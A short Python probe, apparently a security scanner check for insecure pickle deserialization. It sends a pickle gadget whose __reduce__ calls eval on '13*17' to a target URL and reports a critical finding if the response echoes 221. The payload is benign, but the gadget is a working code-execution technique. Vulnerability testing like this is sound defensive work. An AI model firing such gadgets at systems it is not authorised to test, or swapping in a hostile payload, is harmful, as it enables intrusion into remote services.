#!/usr/bin/env python3
"""In-house deterministic insecure-deserialization prober (no GPL deps). Crafts a BENIGN
pickle gadget whose __reduce__ evaluates an arithmetic marker (13*17) server-side, and
confirms RCE if the target reflects the computed product. Proof-only: no destructive ops.
"""

import base64
import json
import pickle
import sys
import urllib.parse
import urllib.request


class _Gadget:
    def __reduce__(self):
        # Benign proof gadget: server-side eval of an arithmetic marker.
        return (eval, ("13*17",))


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: deser-probe <load-url>", file=sys.stderr)
        return 2
    url = sys.argv[1]
    payload = base64.b64encode(pickle.dumps(_Gadget())).decode()
    full = url + ("&" if "?" in url else "?") + "data=" + urllib.parse.quote(payload)
    try:
        with urllib.request.urlopen(full, timeout=5) as resp:
            body = resp.read().decode("utf-8", "replace")
    except Exception:
        return 0
    if "221" in body:
        finding = {
            "template-id": "insecure-deserialization",
            "info": {"severity": "critical", "name": "Insecure deserialization: pickle gadget executed (eval 13*17 -> 221)"},
            "host": url,
            "matched-at": full[:160],
        }
        print(json.dumps(finding))
    return 0


if __name__ == "__main__":
    sys.exit(main())
